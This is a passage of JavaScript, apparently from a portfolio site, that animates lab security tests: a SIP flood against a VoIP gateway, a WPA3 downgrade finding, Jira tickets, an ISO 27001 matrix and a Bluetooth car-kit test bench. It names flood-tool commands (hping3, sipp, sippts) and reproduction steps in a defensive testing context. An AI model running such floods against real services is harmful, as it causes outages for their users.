    host.innerHTML = `
      <div class="sim-h">SAGEMCOM — PROTOCOL VULNERABILITY ASSESSMENT, ATTACK REPLAY</div>
      <div class="sim-p">5-year vulnerability assessment program across 10+ CPE product lines (BBox3, Vodafone, KDG, TalkTalk, Telia, Bouygues, Sunrise, KPN). This replay reconstructs a lab security test on the KDG VoIP gateway: a botnet floods the SIP service with unauthenticated REGISTER/INVITE requests while Wireshark captures the traffic — the gateway CPU saturates and legitimate VoIP calls fail. A second check exposes a WPA3/SAE downgrade misconfiguration on the WiFi interface.</div>

      <div class="sim-section active" data-sim="attack">
        <div class="kpi-strip">
          <div class="kpi-box"><div class="kpi-box-val" id="sg-pps">0</div><div class="kpi-box-lbl">SIP packets / s</div></div>
          <div class="kpi-box"><div class="kpi-box-val" id="sg-cpu">12%</div><div class="kpi-box-lbl">Gateway CPU</div></div>
          <div class="kpi-box"><div class="kpi-box-val" id="sg-reg">0</div><div class="kpi-box-lbl">REGISTER 401 / s</div></div>
          <div class="kpi-box"><div class="kpi-box-val alert" id="sg-fail">0</div><div class="kpi-box-lbl">Legit calls failed</div></div>
        </div>

        <div class="vs-stage" id="sg-stage" style="min-height:270px">
          <svg class="vs-svg"></svg>
          <span class="vs-stage-label">TEST LAB — VOIP VLAN 10 · SIP.SERVER 10.0.0.1</span>

          <div class="vs-node attacker" id="sg-b1" style="left:11%;top:16%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">💻</span>
            <div class="vs-node-title">BOT-1</div>
            <div class="vs-node-sub">10.9.0.11<br>hping3 --flood</div>
          </div>
          <div class="vs-node attacker" id="sg-b2" style="left:11%;top:50%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">💻</span>
            <div class="vs-node-title">BOT-2</div>
            <div class="vs-node-sub">10.9.0.12<br>sipp -r 5000/s</div>
          </div>
          <div class="vs-node attacker" id="sg-b3" style="left:11%;top:84%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">💻</span>
            <div class="vs-node-title">BOT-3</div>
            <div class="vs-node-sub">10.9.0.13<br>sippts invite flood</div>
          </div>

          <div class="vs-node on" id="sg-gw" style="left:50%;top:50%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">☎️</span>
            <div class="vs-node-title">KDG VOIP GATEWAY</div>
            <div class="vs-node-sub" id="sg-gw-sub">10.0.0.1 · Asterisk<br>CPU 12% · SIP OK</div>
          </div>

          <div class="vs-node on" id="sg-cl" style="left:87%;top:50%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">📞</span>
            <div class="vs-node-title">LEGIT SUBSCRIBER</div>
            <div class="vs-node-sub" id="sg-cl-sub">10.0.0.50<br>call active ✓</div>
          </div>

          <div class="vs-phase-line" id="sg-phase">t+0s — baseline: legitimate SIP traffic only</div>
        </div>

        <div class="skill-modal-grid" style="margin-bottom:14px">
          <div>
            <div class="sim-h">WIRESHARK — sip_flood_lab4.pcap (live capture)</div>
            <div class="ws-cap">
              <div class="ws-cap-head">
                <span>NO.</span><span>TIME</span><span>SOURCE</span><span>DEST</span><span>PROTO</span><span>INFO</span>
              </div>
              <div class="ws-cap-body" id="sg-ws"></div>
            </div>
          </div>
          <div>
            <div class="sim-h">WIFI CHECK — WPA3 / SAE HANDSHAKE</div>
            <div class="ws-cap">
              <div class="ws-cap-head" style="grid-template-columns:56px 84px 1fr 64px">
                <span>NO.</span><span>TIME</span><span>INFO</span><span>RESULT</span>
              </div>
              <div style="padding:8px 10px;font-size:11px;line-height:1.9" id="sg-wpa3">
                <div>1182 · Beacon — SSID <b style="color:var(--fg)">KDG-Home-5G</b> · RSN: WPA2-PSK + WPA3-SAE <i style="color:var(--fg-dim)">(transition mode)</i></div>
                <div>1184 · SAE Commit → <span style="color:var(--neon-4)">SAE Confirm MISSING</span> — downgrade path detected</div>
                <div>1187 · <span style="color:var(--neon-3)">WPA2 4-way handshake completed instead</span> — PMK derived from PSK</div>
                <div>1191 · PSK entropy check: <span style="color:var(--neon-3)">10 chars → offline dictionary attack feasible</span></div>
                <div style="margin-top:8px;border-top:1px dashed var(--line);padding-top:8px;color:var(--neon-3)">
                  ⚠ FINDING F-02 — WPA3 transition mode without SAE enforcement: clients silently downgrade to WPA2-PSK → offline cracking. CVSS 7.4 (HIGH), 100% reproducible.
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="sim-h">FINDINGS FROM THIS TEST RUN</div>
        <ul class="vs-steps">
          <li class="vs-step fail"><span class="vs-step-ico">🐞</span><div class="vs-step-body"><b>F-01 · CRITICAL — Unauthenticated SIP flood → gateway DoS</b> — REGISTER/INVITE accepted without auth challenge; 5k req/s starves the CPU; legitimate calls fail. CVSS 7.5, 100% reproducible → Jira <span class="code-inline">KDG-2017-0453</span></div><span class="vs-step-state">FAIL</span></li>
          <li class="vs-step fail"><span class="vs-step-ico">🐞</span><div class="vs-step-body"><b>F-02 · HIGH — WPA3/SAE downgrade</b> — transition mode without enforcement lets clients fall back to WPA2-PSK with weak pre-shared key → offline dictionary attack. CVSS 7.4 → Jira <span class="code-inline">KDG-2017-0453</span></div><span class="vs-step-state">FAIL</span></li>
        </ul>
      </div>

      <div class="sim-section" data-sim="ticket">
        <div class="sim-h">JIRA — TWO SECURITY FINDINGS FROM THE KDG PRODUCT LINE</div>
        <div class="sim-p">Both tickets were filed with full evidence (pcap, logs, screenshots) and reproducible steps — reproduced on GUI and management-plane paths before the pre-release firmware gate.</div>
        <div class="jira-grid">
          <div class="jira-ticket">
            <div class="jira-head">
              <span class="jira-id">KDG-2018-0917</span>
              <span class="jira-sev critical">CRITICAL · CVSS 8.0</span>
            </div>
            <div class="jira-body">
              <div class="jira-meta">
                <b>Product:</b> KDG DOCSIS 3.1 gateway (production firmware)<br>
                <b>Type:</b> Functional / Availability — mass impact<br>
                <b>Reproducibility:</b> 100% — GUI &amp; SNMP both
              </div>
              <h5>Description</h5>
              Factory reset from GUI or SNMP pushes the gateway into an infinite reboot loop — the device is effectively bricked; no further management access is possible.
              <h5>Steps to Reproduce</h5>
              <ol class="jira-steps">
                <li>Login to the gateway GUI as admin (default lab credentials)</li>
                <li>Trigger <span class="code-inline">factory reset</span> from Administration → Maintenance</li>
                <li>Observe the boot: cycle 1 → cycle 2 → cycle 3 … boot loop never ends</li>
                <li>Repeat over SNMP (<span class="code-inline">snmpset … enterprises… reboot.0 i 2</span>) — same infinite loop</li>
              </ol>
              <h5>Evidence</h5>
              boot_cycle.log · serial_console.txt · 5 screenshots (GUI + CLI)
              <h5>Remediation (shipped pre-release)</h5>
              <ul class="jira-rem">
                <li>CLI boot-interrupt mechanism during the loop</li>
                <li>Manual firmware re-upgrade to same version recovers the device</li>
                <li>Fix validated by TC-117-03 regression — no recurrence</li>
                <li>Cycle closed before production — mass customer impact avoided</li>
              </ul>
            </div>
          </div>

          <div class="jira-ticket">
            <div class="jira-head">
              <span class="jira-id">KDG-2017-0453</span>
              <span class="jira-sev critical">CRIT+HIGH · CVSS 7.5</span>
            </div>
            <div class="jira-body">
              <div class="jira-meta">
                <b>Product:</b> KDG gateway — VoIP stack + WiFi interface<br>
                <b>Type:</b> Security — DoS / cryptographic downgrade<br>
                <b>Reproducibility:</b> 100% — repeated on 3 firmware builds
              </div>
              <h5>Description</h5>
              Two linked findings: (1) the SIP service accepts unauthenticated REGISTER/INVITE floods until the CPU saturates and legitimate calls fail; (2) the WiFi interface runs WPA2/WPA3 "transition mode" without SAE enforcement, silently downgrading clients to WPA2-PSK.
              <h5>Steps to Reproduce</h5>
              <ol class="jira-steps">
                <li>Connect 3 test clients (bots) to the VoIP VLAN 10 segment</li>
                <li>Launch <span class="code-inline">sipp -r 5000</span> REGISTER flood + <span class="code-inline">sippts invite</span> against 10.0.0.1</li>
                <li>Watch the gateway CPU climb to ~99% in Wireshark + device dashboard</li>
                <li>Attempt a legitimate REGISTER from 10.0.0.50 → <span class="code-inline">500 Server Internal Error</span> — call fails</li>
                <li>WiFi: associate a WPA3-SAE client to <span class="code-inline">KDG-Home-5G</span>, capture with Wireshark → 4-way WPA2 handshake instead of SAE (downgrade confirmed)</li>
              </ol>
              <h5>Evidence</h5>
              sip_flood_lab4.pcap · sae_downgrade.pcap · cpu_graph.png
              <h5>Remediation</h5>
              <ul class="jira-rem">
                <li>SIP: authentication challenge (401 + digest) before REGISTER processing</li>
                <li>SIP: per-source rate-limiting + flood detection alarm</li>
                <li>WiFi: WPA3-SAE-only mode (PMF required) — transition mode removed</li>
                <li>Regression tests TC-SIP-0453-01 / TC-WIFI-0453-02 added to the suite</li>
              </ul>
            </div>
          </div>
        </div>
      </div>

      <div class="sim-section" data-sim="traceability">
        <div class="sim-h">ISO 27001:2022 — TRACEABILITY CHAIN (requirement → test case → finding)</div>
        <div class="ah-flow">
          <div class="ah-step"><span class="ah-step-no">01</span>📋 Requirement</div>
          <div class="ah-step"><span class="ah-step-no">02</span>🧪 Test Case</div>
          <div class="ah-step"><span class="ah-step-no">03</span>⚙️ Execution</div>
          <div class="ah-step"><span class="ah-step-no">04</span>🐞 Finding</div>
        </div>
        <div class="ah-flow" style="margin-bottom:14px">
          <div class="ah-step"><span class="ah-step-no">05</span>🎫 Jira Ticket</div>
          <div class="ah-step"><span class="ah-step-no">06</span>🔧 Remediation</div>
          <div class="ah-step"><span class="ah-step-no">07</span>✅ Re-test</div>
          <div class="ah-step"><span class="ah-step-no">08</span>📁 Audit Evidence</div>
        </div>

        <div class="sim-h">ANNEX A MATRIX — HOW EACH TESTCASE LINKS REQUIREMENTS &amp; FINDINGS</div>
        <div style="overflow-x:auto">
          <table class="iso-table">
            <thead>
              <tr>
                <th>ISO CONTROL</th><th>REQUIREMENT</th><th>TEST CASE</th><th>TEST OBJECTIVE</th><th>RESULT</th><th>FINDING / EVIDENCE</th>
              </tr>
            </thead>
            <tbody>
              <tr class="fail">
                <td>A.8.8<br><span style="color:var(--fg-dim)">Tech. vulnerability mgmt</span></td>
                <td><span class="tcode">REQ-KDG-2018-117</span><br>"Factory reset must restore default config and reboot normally"</td>
                <td><span class="tcode">TC-117-01</span> GUI reset<br><span class="tcode">TC-117-02</span> SNMP reset<br><span class="tcode">TC-117-03</span> regression</td>
                <td>Trigger factory reset from GUI and SNMP; device must come back to operational state</td>
                <td><span class="pill fail">FAIL</span></td>
                <td><span class="tcode">KDG-2018-0917</span><br>boot_cycle.log · serial_console.txt</td>
              </tr>
              <tr class="fail">
                <td>A.8.20<br><span style="color:var(--fg-dim)">Networks security</span></td>
                <td><span class="tcode">REQ-KDG-2017-201</span><br>"SIP service must survive 5,000 req/s without service loss"</td>
                <td><span class="tcode">TC-SIP-0453-01</span> flood 60s</td>
                <td>REGISTER/INVITE flood at 5k req/s for 60s; legitimate calls must still complete</td>
                <td><span class="pill fail">FAIL</span></td>
                <td><span class="tcode">KDG-2017-0453 (F-01)</span><br>sip_flood_lab4.pcap</td>
              </tr>
              <tr class="fail">
                <td>A.8.24<br><span style="color:var(--fg-dim)">Use of cryptography</span></td>
                <td><span class="tcode">REQ-KDG-2017-208</span><br>"WPA3-SAE must be enforced on 5GHz SSID"</td>
                <td><span class="tcode">TC-WIFI-0453-02</span> SAE handshake</td>
                <td>WPA3 client must complete SAE handshake; no downgrade to WPA2-PSK allowed</td>
                <td><span class="pill fail">FAIL</span></td>
                <td><span class="tcode">KDG-2017-0453 (F-02)</span><br>sae_downgrade.pcap</td>
              </tr>
              <tr class="pass">
                <td>A.8.5<br><span style="color:var(--fg-dim)">Secure authentication</span></td>
                <td><span class="tcode">REQ-KDG-2018-119</span><br>"Default management credentials must be rejected"</td>
                <td><span class="tcode">TC-119-01</span> default creds</td>
                <td>GUI/SSH login with factory defaults must fail and lock out after 3 attempts</td>
                <td><span class="pill pass">PASS</span></td>
                <td>— no finding · auth_lock.log retained</td>
              </tr>
            </tbody>
          </table>
        </div>
        <div class="sim-p" style="margin-top:12px">Every requirement is derived from an ISO 27001:2022 Annex A control, executed through one or more test cases, and every failed test case is traceable to a Jira finding with attached evidence — the audit chain requirement→test→finding→evidence is preserved end-to-end.</div>
      </div>
    `;

    /* ---- Tab 1: attack replay animation ---- */
    const stage = $('#sg-stage', host);
    const svg = vsInitSvg(stage, 270);
    const VB = 270;
    const linkB1 = vsLink(svg, 11, 16, 50, 50, VB, { cls: 'attack', hidden: true });
    const linkB2 = vsLink(svg, 11, 50, 50, 50, VB, { cls: 'attack', hidden: true });
    const linkB3 = vsLink(svg, 11, 84, 50, 50, VB, { cls: 'attack', hidden: true });
    const linkCl = vsLink(svg, 87, 50, 50, 50, VB, { hidden: true });

    const phase = $('#sg-phase', host);
    const gwSub = $('#sg-gw-sub', host);
    const clSub = $('#sg-cl-sub', host);
    const gwNode = $('#sg-gw', host);
    const clNode = $('#sg-cl', host);
    const bots = ['#sg-b1', '#sg-b2', '#sg-b3'].map((s) => $(s, host));

    // wireshark stream
    const wsBody = $('#sg-ws', host);
    const wsTemplates = [
      ['err',  'SIP/2.0',  'Request: REGISTER sip:lab.kdg.voip (no Authorization header)'],
      ['err',  'SIP/2.0',  'Status: 401 Unauthorized'],
      ['err',  'SIP/2.0',  'Request: INVITE sip:100@kdg (malformed SDP — s= line missing)'],
      ['warn', 'ICMP',     'Echo (ping) request  id=0x0001, seq={SEQ}'],
      ['err',  'SIP/2.0',  'Request: REGISTER (retransmission #{RTX} — no auth)'],
      ['ok',   'ARP',      'Who has 10.0.0.1?  Tell 10.9.0.{B}'],
      ['ok',   'TLSv1.2',  'Application Data (len=512)'],
      ['err',  'SIP/2.0',  'Status: 500 Server Internal Error'],
      ['err',  'SIP/2.0',  'Request: OPTIONS * — flood keepalive'],
      ['warn', 'UDP',      'Malformed packet (declared 1400B, captured 512B)']
    ];
    let wsNo = 4187, seq = 8400, rtx = 3;
    const botIps = ['11', '12', '13'];
    function pushWs() {
      const pick = wsTemplates[Math.floor(Math.random() * wsTemplates.length)];
      const [lvl, proto, info] = pick;
      const row = el('div', `ws-row ${lvl === 'err' ? 'sip' : ''} ${lvl}`);
      const infoTxt = info.replace('{SEQ}', seq++).replace('{RTX}', rtx++).replace('{B}', botIps[Math.floor(Math.random() * 3)]);
      row.innerHTML = `
        <span class="ws-no">${wsNo++}</span>
        <span class="ws-t">0.${String(Math.floor(Math.random() * 900) + 100)}</span>
        <span>10.9.0.${botIps[Math.floor(Math.random() * 3)]}</span>
        <span>10.0.0.1</span>
        <span class="ws-pr">${proto}</span>
        <span class="ws-info">${infoTxt}</span>`;
      wsBody.appendChild(row);
      const all = $$('.ws-row', wsBody);
      if (all.length > 26) all[0].remove();
      wsBody.scrollTop = wsBody.scrollHeight;
    }
    for (let i = 0; i < 8; i++) pushWs();

    function playAttack() {
      // reset
      wsBody.innerHTML = '';
      for (let i = 0; i < 8; i++) pushWs();
      [linkB1, linkB2, linkB3].forEach((l) => { if (l) { l.off(); l.deactivate(); } });
      if (linkCl) { linkCl.deactivate(); }
      if (linkCl) linkCl.packets(3, 'var(--neon)', 1.6).on();
      gwNode.className = 'vs-node on';
      clNode.className = 'vs-node on';
      clSub.innerHTML = '10.0.0.50<br>call active ✓';
      bots.forEach((b) => { if (b) b.className = 'vs-node attacker'; });

      let cpu = 12, pps = 0, reg401 = 0, fails = 0;
      const kpi = $('#sg-pps', host), kcpu = $('#sg-cpu', host),
            kreg = $('#sg-reg', host), kfail = $('#sg-fail', host);

      // phase 0: baseline
      phase.innerHTML = 't+0s — baseline: legitimate SIP traffic only';
      gwSub.innerHTML = '10.0.0.1 · Asterisk<br>CPU 12% · SIP OK';
      if (kcpu) kcpu.textContent = '12%';

      // phase 1: attack starts
      timers.later(() => {
        phase.innerHTML = '<span class="warn">t+2s — botnet ramp-up: unauthenticated REGISTER/INVITE flood begins</span>';
        bots.forEach((b) => { if (b) b.className = 'vs-node attacker on'; });
        [linkB1, linkB2, linkB3].forEach((l) => {
          if (l) l.activate().packets(5, 'var(--neon-3)', 0.9).on();
        });
      }, 2000);

      // phase 2: CPU saturating
      timers.later(() => {
        phase.innerHTML = '<span class="err">t+7s — gateway CPU saturated — REGISTER/INVITE queue overflows</span>';
        gwNode.className = 'vs-node hit';
      }, 7000);

      // phase 3: legit calls fail
      timers.later(() => {
        phase.innerHTML = '<span class="err">t+10s — legitimate subscriber REGISTER → 500 — VoIP service DOWN</span>';
        clNode.className = 'vs-node hit';
        clSub.innerHTML = '10.0.0.50<br>REGISTER → 500 ✗';
        if (linkCl) { linkCl.off(); linkCl.packets(2, 'var(--neon-3)', 1.1).on(); }
      }, 10000);

      // phase 4: verdict
      timers.later(() => {
        phase.innerHTML = '<span class="err">FINDING F-01 — DoS: unauthenticated SIP flood · CVSS 7.5 · 100% reproducible → Jira KDG-2017-0453</span>';
      }, 13000);

      // KPI + capture ticker
      const tick = timers.every(() => {
        const ramp = Date.now();
        pushWs();
        const t = (ramp - tickStart) / 1000;
        const target = t < 2 ? 120 : Math.min(18400, 120 + (t - 2) * 3400);
        pps = Math.round(target + (Math.random() * 400 - 200));
        cpu = Math.min(99, t < 2 ? 12 : 12 + (t - 2) * 16);
        reg401 = t < 2 ? 0 : Math.round(Math.min(5100, (t - 2) * 950));
        fails = t < 10 ? 0 : Math.min(96, Math.round((t - 10) * 24));
        if (kpi) kpi.textContent = pps.toLocaleString();
        if (kcpu) kcpu.textContent = Math.round(cpu) + '%';
        if (kreg) kreg.textContent = reg401.toLocaleString();
        if (kfail) kfail.textContent = fails;
        if (t > 1.5 && t < 9.5) gwSub.innerHTML = `10.0.0.1 · Asterisk<br>CPU ${Math.round(cpu)}% · queue overflow`;
        if (t >= 9.5) gwSub.innerHTML = '10.0.0.1 · Asterisk<br>CPU 99% · SIP DOWN ✗';
      }, 700);
      const tickStart = Date.now();
      timers.later(() => clearInterval(tick), 14000);

      // loop the replay
      timers.later(() => playAttack(), 15500);
    }
    playAttack();

    // animate traceability flow on demand (runs once)
    $$('.ah-step', host).forEach((s, i) => {
      timers.later(() => s.classList.add('active'), 400 + i * 160);
      timers.later(() => { s.classList.remove('active'); s.classList.add('done'); }, 400 + i * 160 + 550);
    });

    ctx.tabs = [
      { id: 'attack',       label: '// Attack Replay — DDoS & SIP' },
      { id: 'ticket',       label: '// Jira Ticket' },
      { id: 'traceability', label: '// ISO 27001 Matrix' }
    ];
  };

  /* =================================================================
   *  5. FOCUS INTERNATIONAL — Bluetooth car-kit stress test
   * ================================================================= */
  SIMS['bluetooth-test'] = (host, ctx) => {
    const timers = makeTimers(host);
    host.innerHTML = `
      <div class="sim-h">FOCUS INTERNATIONAL — PARROT AUTOMOTIVE BLUETOOTH VALIDATION</div>
      <div class="sim-p">Manual validation of Bluetooth car-kit connectivity: incoming/outgoing calls, music streaming, contact sync, multi-phone support. Stress-tested protocol state machines: repeated connect/disconnect, multi-phone handoff, overnight persistence. Reported in Bugzilla with reproducible steps.</div>

      <div class="sim-section active" data-sim="sim">
        <div class="sim-h">BLUETOOTH SIGNAL + STATE MACHINE</div>
        <div class="bt-wave" id="bt-wave"></div>
        <div class="sim-h">ACTIVE TESTS</div>
        <ul style="list-style:none;padding:0;font-size:12px;color:var(--fg-soft);line-height:1.8">
          <li>▸ <span class="stack-chip">CK3100</span> + iPhone 3GS — pairing</li>
          <li>▸ <span class="stack-chip">Porsche Carkit</span> + Nokia N73 — incoming call</li>
          <li>▸ Multi-phone handoff: iPhone ↔ Blackberry ↔ Nokia</li>
          <li>▸ Overnight persistence: 12h connected, re-test on wake</li>
        </ul>
        <div class="sim-h" style="margin-top:14px">STATE MACHINE — 1000 CYCLES</div>
        <div class="siem-kpis" style="grid-template-columns:repeat(4,1fr)">
          <div class="siem-kpi"><div class="siem-kpi-val" id="bt-cycles">0</div><div class="siem-kpi-lbl">CONNECT/DISCONNECT CYCLES</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val" id="bt-paired">3</div><div class="siem-kpi-lbl">PAIRED PHONES</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val" id="bt-calls">0</div><div class="siem-kpi-lbl">CALLS TESTED</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val" id="bt-bugs">0</div><div class="siem-kpi-lbl">BUGS FOUND</div></div>
        </div>
      </div>

      <div class="sim-section" data-sim="bug">
        <div class="sim-h">BUGZILLA BUG REPORT — TEMPLATE</div>
        <pre class="code-viewer"><span class="k">Product</span>:      <span class="s">Parrot CK3100 — firmware v1.06b</span>
<span class="k">Component</span>:    <span class="s">Bluetooth stack — state machine</span>
<span class="k">Severity</span>:     <span class="s">major</span>
<span class="k">Title</span>:        <span class="s">Multi-phone handoff loses call when 3rd phone pairs</span>

<span class="k">Steps to Reproduce</span>:
  1. Pair iPhone 3GS — establish call
  2. Pair Nokia N73 — establish call (iPhone put on hold)
  3. Pair Blackberry 9700 — observe state of iPhone/Nokia calls

<span class="k">Expected</span>:     <span class="s">3rd phone pairs, calls queue correctly</span>
<span class="k">Actual</span>:       <span class="s">3rd pairing drops BOTH active calls without notice</span>

<span class="k">Logs</span>:         <span class="s">bt_hci_log_2012-08-14.txt attached</span>
<span class="k">Environment</span>: <span class="s">CK3100 + 3 phones (BT v2.0 + EDR), 12V car adapter</span>
<span class="k">Reported</span>:    <span class="s">directly to Parrot (France) — daily report cycle</span></pre>
      </div>

      <div class="sim-section" data-sim="carkit">
        <div class="sim-h">LIVE TEST BENCH — PORSCHE CARKIT + MULTI-PHONE</div>
        <div class="sim-p">Replay of a real bench session: phones paired to the production Porsche head-unit over HFP (call control), PBAP (contacts) and A2DP (audio). Watch the head-unit HMI, the Bluetooth links and the per-phone states while test plan TC-BT-2013-088 executes — ending with a security check: an unauthorised pairing attempt that must be rejected.</div>

        <div class="btb-stage" id="btb-stage">
          <svg class="vs-svg"></svg>
          <span class="vs-stage-label">BT TEST BENCH — CLASS 2 · 10m · HFP/PBAP/A2DP</span>

          <div class="btb-phone" id="btb-p1" style="left:13%;top:18%">
            <div class="btb-phone-ico">📱</div>
            <div class="btb-phone-name">iPhone 3GS</div>
            <div class="btb-phone-sub">HFP · PBAP · A2DP</div>
            <div class="btb-state" id="btb-s1">IDLE</div>
          </div>
          <div class="btb-phone" id="btb-p2" style="left:13%;top:80%">
            <div class="btb-phone-ico">📱</div>
            <div class="btb-phone-name">Nokia N73</div>
            <div class="btb-phone-sub">HFP · PBAP</div>
            <div class="btb-state" id="btb-s2">IDLE</div>
          </div>
          <div class="btb-phone" id="btb-p3" style="left:87%;top:18%">
            <div class="btb-phone-ico">📱</div>
            <div class="btb-phone-name">Blackberry 9700</div>
            <div class="btb-phone-sub">HFP · A2DP</div>
            <div class="btb-state" id="btb-s3">IDLE</div>
          </div>
          <div class="btb-phone" id="btb-p4" style="left:87%;top:80%">
            <div class="btb-phone-ico">📵</div>
            <div class="btb-phone-name">Unknown device</div>
            <div class="btb-phone-sub">00:11:22:33:44:55 · no PIN</div>
            <div class="btb-state" id="btb-s4">NOT PAIRED</div>
          </div>

          <div class="btb-hmi">
            <div class="btb-hmi-brand">PORSCHE</div>
            <div class="btb-hmi-screen" id="btb-screen">STANDBY</div>
          </div>
        </div>

        <div class="sim-h">TEST PLAN TC-BT-2013-088 — LIVE EXECUTION</div>
        <ul class="vs-steps" id="btb-steps">
          <li class="vs-step pending"><span class="vs-step-ico">🔗</span><div class="vs-step-body"><b>Pair iPhone 3GS</b> — secure simple pairing, PIN exchange, link-key stored in carkit NV memory</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">📇</span><div class="vs-step-body"><b>Phonebook sync (PBAP)</b> — all 248 contacts pulled to the head-unit, special characters verified on HMI display</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">📞</span><div class="vs-step-body"><b>Pair Nokia N73 + incoming call</b> — ring tone on car speakers, answered from steering-wheel button, audio routed, mic active</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">📤</span><div class="vs-step-body"><b>Outgoing call — voice dial via iPhone</b> — HFP AT+BLDN, Nokia call auto-held, audio source switch &lt; 1s</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">➕</span><div class="vs-step-body"><b>Multi-point test</b> — Blackberry paired while a call is queued: 3 phones connected simultaneously, active-audio arbitration correct</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">🛡️</span><div class="vs-step-body"><b>Security check — unauthorised pairing</b> — rogue device attempts pairing with no PIN: must be REJECTED and carkit must leave discoverable mode</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">🔁</span><div class="vs-step-body"><b>Stress — 1000 connect/disconnect cycles</b> — no state-machine deadlock, no lost pairing, active calls survive re-connect</div><span class="vs-step-state">QUEUED</span></li>
        </ul>
      </div>
    `;

    // bluetooth wave animation
    const wave = $('#bt-wave', host);
    const bars = [];
    for (let i = 0; i < 60; i++) {
      const b = el('div', 'bt-wave-bar');
      b.style.left = `${(i / 60) * 100}%`;
      wave.appendChild(b);
      bars.push(b);
    }
    let cycles = 0, calls = 0, bugs = 0;
    timers.every(() => {
      bars.forEach((b, i) => {
        const h = Math.abs(Math.sin((Date.now() / 200) + i * 0.3)) * 70 + 5;
        b.style.height = h + 'px';
      });
    }, 60);

    // counter interval
    timers.every(() => {
      cycles += Math.floor(Math.random() * 7) + 1;
      if (Math.random() > 0.7) calls += 1;
      if (Math.random() > 0.95) bugs += 1;
      const c1 = $('#bt-cycles', host); if (c1) c1.textContent = cycles;
      const c2 = $('#bt-calls', host);  if (c2) c2.textContent = calls;
      const c3 = $('#bt-bugs', host);   if (c3) c3.textContent = bugs;
    }, 600);

    /* ---- 3rd tab: Porsche carkit live bench ---- */
    const stage = $('#btb-stage', host);
    const svg = vsInitSvg(stage, 260);
    const VB = 260;
    // links from each phone to the HMI (packets hidden until phase runs)
    const l1 = vsLink(svg, 13, 18, 50, 50, VB, { hidden: true }); // iPhone
    const l2 = vsLink(svg, 13, 80, 50, 50, VB, { hidden: true }); // Nokia
    const l3 = vsLink(svg, 87, 18, 50, 50, VB, { hidden: true }); // Blackberry
    const l4 = vsLink(svg, 87, 80, 50, 50, VB, { hidden: true }); // rogue

    const screen = $('#btb-screen', host);
    const hmi = (html, alert) => {
      screen.className = 'btb-hmi-screen' + (alert ? ' alert' : '');
      screen.innerHTML = html;
    };
    const phone = (id, stateId, cls, stateTxt) => {
      const p = $(id, host); const s = $(stateId, host);
      if (p) p.className = 'btb-phone ' + cls;
      if (s) s.textContent = stateTxt;
    };
    const resetBench = () => {
      phone('#btb-p1', '#btb-s1', '', 'IDLE');
      phone('#btb-p2', '#btb-s2', '', 'IDLE');
      phone('#btb-p3', '#btb-s3', '', 'IDLE');
      phone('#btb-p4', '#btb-s4', '', 'NOT PAIRED');
      [l1, l2, l3, l4].forEach((l) => { if (l) { l.off(); l.deactivate(); } });
      hmi('STANDBY');
    };

    function playBench() {
      resetBench();
      const phases = [
        { // 1. pair iPhone
          dur: 2600,
          run() {
            hmi('PAIRING…<br><span class="big">iPhone 3GS</span>');
            if (l1) { l1.activate(); }
          },
          end() {
            phone('#btb-p1', '#btb-s1', 'linked', 'CONNECTED');
            if (l1) l1.packets(3, 'var(--neon)', 1.1).on();
            hmi('PAIRED<br><span class="big">iPhone 3GS</span><br>1 DEVICE');
          }
        },
        { // 2. PBAP contact sync
          dur: 3200,
          run() {
            hmi('PHONEBOOK SYNC<br><span class="big">0 / 248</span>');
            if (l1) { l1.off(); l1.packets(6, 'var(--neon-2)', 0.7).on(); }
            let n = 0;
            const cnt = timers.every(() => {
              n = Math.min(248, n + 9);
              hmi(`PHONEBOOK SYNC<br><span class="big">${n} / 248</span>`);
              if (n >= 248) clearInterval(cnt);
            }, 90);
            timers.later(() => clearInterval(cnt), 3200);
          },
          end() {
            if (l1) { l1.off(); l1.packets(2, 'var(--neon)', 1.4).on(); }
            hmi('PHONEBOOK<br><span class="big">248 CONTACTS ✓</span>');
          }
        },
        { // 3. pair Nokia + incoming call
          dur: 3400,
          run() {
            phone('#btb-p2', '#btb-s2', 'ringing', 'INCOMING CALL');
            if (l2) { l2.activate(); l2.packets(4, 'var(--neon-4)', 0.9).on(); }
            hmi('PAIRING…<br><span class="big">Nokia N73</span><br>then INCOMING CALL…');
            timers.later(() => {
              phone('#btb-p2', '#btb-s2', 'linked', 'RINGING → ANSWERED');
              hmi('INCOMING CALL<br><span class="big">Nokia N73</span><br>📞 ANSWERED — MIC ON');
            }, 1500);
          },
          end() {
            phone('#btb-p2', '#btb-s2', 'linked', 'CALL ACTIVE');
            if (l2) { l2.off(); l2.packets(2, 'var(--neon)', 1.3).on(); }
            hmi('CALL 00:07<br><span class="big">Nokia N73</span><br>audio → car speakers');
          }
        },
        { // 4. outgoing call via iPhone (Nokia held)
          dur: 3200,
          run() {
            phone('#btb-p2', '#btb-s2', 'linked hold', 'ON HOLD');
            phone('#btb-p1', '#btb-s1', 'linked', 'DIALING…');
            if (l1) { l1.off(); l1.packets(5, 'var(--neon-4)', 0.8).on(); }
            hmi('VOICE DIAL<br><span class="big">+216 98 123 456</span><br>AT+BLDN → dialing…');
            timers.later(() => {
              hmi('CALL 00:04<br><span class="big">+216 98 123 456</span><br>Nokia call auto-held');
            }, 1400);
          },
          end() {
            phone('#btb-p1', '#btb-s1', 'linked', 'CALL ACTIVE');
            if (l1) { l1.off(); l1.packets(2, 'var(--neon)', 1.3).on(); }
            hmi('2 CALLS<br><span class="big">1 ACTIVE · 1 HELD</span>');
          }
        },
        { // 5. multi-point: Blackberry joins
          dur: 3000,
          run() {
            phone('#btb-p3', '#btb-s3', 'linked', 'CONNECTING');
            if (l3) { l3.activate(); l3.packets(3, 'var(--neon)', 1.0).on(); }
